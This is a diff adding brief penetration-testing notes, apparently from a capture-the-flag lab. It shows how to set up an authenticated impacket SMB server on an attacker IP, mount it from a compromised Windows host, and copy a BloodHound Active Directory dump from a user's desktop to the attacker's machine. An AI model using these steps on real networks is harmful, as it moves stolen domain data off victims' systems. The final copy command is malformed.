@@ -1,0 +1,11 @@
+If you have issues with connecting to the SMB share from the Windows machine, setup the SMB server with auth
+sudo smbserver.py -username root -password root -smb2support share .
+
+Then you'll have to mount the share
+net use Z: \\192.168.45.181\share /user:root root
+
+Finally you'll be able to access the share using cd \\192.168.45.181\share
+
+The reason for this is because some policies disallow guest shares which are shares without auth 
+
+cp C:\users\fsmith\Desktop\"sauna audit_20250221165803_BloodHound.zip   to copy the file to your local machine
